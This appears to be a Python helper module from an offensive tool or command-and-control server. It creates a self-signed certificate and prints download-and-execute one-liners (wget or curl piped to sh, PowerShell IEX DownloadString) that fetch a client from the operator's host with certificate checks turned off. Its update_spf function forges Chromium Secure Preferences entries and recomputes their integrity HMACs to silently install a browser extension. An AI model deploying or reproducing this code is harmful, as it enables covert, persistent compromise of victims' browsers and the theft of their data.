from OpenSSL import crypto
from pathlib import Path
import config
import hashlib
import hmac
import io
import json
import time


def generate_self_signed_cert(cert_file, key_file):
    key = crypto.PKey()
    key.generate_key(crypto.TYPE_RSA, 2048)

    cert = crypto.X509()
    cert.get_subject().C = 'XX'
    cert.get_subject().ST = 'ST'
    cert.get_subject().L = 'L'
    cert.get_subject().O = 'O'
    cert.get_subject().OU = 'OU'
    cert.get_subject().CN = 'SIBREXIN'
    cert.set_serial_number(1000)
    cert.gmtime_adj_notBefore(0)
    cert.gmtime_adj_notAfter(10 * 365 * 24 * 60 * 60)
    cert.set_issuer(cert.get_subject())
    cert.set_pubkey(key)
    cert.sign(key, 'sha256')

    with open(cert_file, 'wb') as cert_file_out:
        cert_file_out.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert))

    with open(key_file, 'wb') as key_file_out:
        key_file_out.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, key))


def is_self_signed(cert_path):
    with open(cert_path, 'rb') as cert_file:
        cert_data = cert_file.read()

    cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert_data)

    return cert.get_subject() == cert.get_issuer()


def ensure_ssl_cert():
    if not (Path(config.CERT_FILE).exists() and Path(config.KEY_FILE).exists()):
        print('[+] TLS certificate not found. Generating a self-signed certificate...')
        generate_self_signed_cert(config.CERT_FILE, config.KEY_FILE)
        config.SELF_SIGNED_CERT = True
    else:
        print('[+] TLS certificate found. Checking if it is self-signed...')
        if is_self_signed(config.CERT_FILE):
            print('[+] The existing TLS certificate is self-signed.')
            config.SELF_SIGNED_CERT = True
        else:
            print('[+] The existing TLS certificate is NOT self-signed.')


def get_inmem_file(data):
    imf = io.BytesIO()
    imf.write(data.encode('utf-8'))
    imf.seek(0)

    return imf


def show_oneliners(hostname):
    url = f'https://{hostname}/download/client'
    if config.SELF_SIGNED_CERT:
        wget_check = ' --no-check-certificate'
        curl_check = ' -k'
        net_check = '[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }; '
    else:
        wget_check = curl_check = net_check = ''

    print(f'''--------------------


[+] One-liners:
    
wget -q{wget_check} {url}/linux -O - | sh &> /dev/null
curl -s{curl_check} {url}/macos | sh
{net_check}IEX (New-Object Net.WebClient).DownloadString("{url}/windows")


--------------------''')


# Update Secure Preferences File
def update_spf(extension, os, sid, user, data):
    jdata = json.loads(data)

    if os == 'windows':
        slash = '\\'
        encoding = 'utf-16le'
    else:
        slash = '/'
        encoding = 'utf-8'

    extension_fullpath = f'{config.USERS_PATH[os]}{slash}{user}{slash}{config.EXTENSION_PATH[os]}{slash}{extension}'
    
    m = hashlib.sha256();
    m.update(bytes(extension_fullpath.encode(encoding)))
    uuid = ''.join([chr(int(i, base = 16) + ord('a')) for i in m.hexdigest()][:32])

    timestamp = str(int(time.time() * 1000000))

    d = jdata['extensions']['settings']
    d[uuid] = config.SECURE_PREFERENCES_EXTENSION
    d[uuid]['path'] = extension_fullpath
    d[uuid]['first_install_time'] = timestamp
    d[uuid]['last_update_time'] = timestamp

    jdata['extensions']['settings'] = dict(sorted(d.items()))
    
    jpath = 'extensions.settings.' + uuid

    msg = sid + jpath + json.dumps(jdata['extensions']['settings'][uuid], separators = (',', ':'), ensure_ascii = False).replace('<', '\\u003C').replace('\\u2122', '™')
    msg = msg.encode('utf-8')
    extension_hmac = hmac.new(config.SEED[os], msg, hashlib.sha256)

    # Insert hmac entry
    d = jdata['protection']['macs']['extensions']['settings']
    d[uuid] = extension_hmac.hexdigest().upper()
    jdata['protection']['macs']['extensions']['settings'] = dict(sorted(d.items()))

    # Compute super_hmac
    if os != 'linux':
        super_msg = sid + json.dumps(jdata['protection']['macs']).replace(' ', '')
        super_msg = super_msg.encode('utf-8')
        super_hmac = hmac.new(config.SEED[os], super_msg, hashlib.sha256)
        jdata['protection']['super_mac'] = super_hmac.hexdigest().upper()

    return json.dumps(jdata)
